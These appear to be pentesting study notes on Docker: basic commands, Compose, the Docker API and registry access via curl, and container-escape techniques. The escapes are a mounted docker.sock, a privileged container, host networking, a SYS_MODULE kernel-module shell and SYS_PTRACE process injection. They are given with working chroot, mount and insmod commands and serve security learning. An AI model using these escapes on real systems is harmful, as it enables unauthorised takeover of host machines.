https://www.youtube.com/watch?v=0hrv0qyOEd0
https://bootcamps.pentesteracademy.com/course/container-security-on-demand

## Docker Commands
```bash
docker info
docker pull IMAGE:TAG
docker images / docker image ls

docker run -dt IMAGE # detached
docker run -it IMAGE # interactive

docker ps / docker container ls

docker inspect ID/NAME
docker attach ID/NAME
docker exec -dt ID/NAME COMMAND
docker exec -it ID/NAME COMMAND

docker stop ID/NAME
docker start ID/NAME
docker kill ID/NAME

docker container ...
docker image ...
docker network ...
```
---
## Dockerfile
```Dockerfile
FROM alpine

COPY script.sh /root/

run chmod +x /root/script
```

```bash
docker build -t IMAGE .
```
---
## docker-compose.yaml
```yaml
version: "3.5"
services:
	appserver:
		image: IMAGE
		networks:
			- backend
	memcache:
		image: IMAGE
		networks:
			- backend
networks:
	backend:
		name: test-net
		driver: bridge
```

```bash
docker-compose up
```
---
## Docker API without Docker client
When you don't have docker client installed you can use http api/unix socket.
```bash
curl http://localhost:2375/images/json
curl --unix-socket /var/run/docker.sock http://localhost/images/json

curl http://HOST/v2/_catalog
curl http://HOST/v2/REPO/tags/list
curl http://HOST/v2/REPO/manifests/TAG
curl -s http://HOST/v2/REPO/blobs/sha256:SHASUM --output layer1.tar
```

Or when we have no docker socket but only tcp api.
```bash
export DOCKER_HOST="tcp://127.0.0.1:2375"
docker ps
```

---
## Mounted Docker Socket
#### Insecure Option
`-v /var/run/docker.sock:/var/run/docker.sock`
#### Why?
Management or monitoring purposes (portainer, sysdig, gitlab runner).
#### Enumeration
Inside of the docker container we can search for docker socket using find command.
```bash
find / -name docker.sock 2>/dev/null
```
#### Exploitaion
If we find the socket, we can start another container using said socket and mount host's filesystem into it, then chroot to the host filesystem.
```bash
docker run -it -v /:/host IMAGE bash
chroot /host bash
```
---
## Privileged Container
#### Insecure Option
`--privileged`
#### Why?
Used for monitoring privileged containers.
#### Enumeration
We can use `capsh --print` to enumerate linux capabilities. 
#### Exploitation
Then when we can see main harddisk (/dev/sda), we will mount and chroot into it.
```bash
mount /dev/sda /host
chroot /host bash
```
---
## Shared Network Namespace
#### Insecure Option
`--network host`
#### Why?
portainer
#### Enumeration
We will use `ip a` to look for host interfaces.
#### Exploitation
Portforward from container to a host. If portainer is present, run new container > mount host's root > chmod into it.

---
## SYS_MODULE Capability
#### Insecure Option
`--cap-add SYS_MODULE`
#### Why?
Monitoring
#### Enumeration
We can use `capsh --print` to enumerate linux capabilities. 
#### Exploitation
Create the kernel module.

Then create a Makefile.
```bash
obj-m +=shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Make the module.
```bash
make
```

And insert the kernel module.
```
insmod shell.ko
```
---
## SYS_PTRACE Capability
#### Insecure Options
`--pid=host --cap-add SYS_PTRACE`
#### Why?
Debugger containers.
#### Enumeration
Watch out for same PID namespace as host. 
#### Exploitation
https://0x00sec.org/t/linux-infecting-running-processes/1097

Update shellcode and compile the code.

```bash
./inject PID
```
---
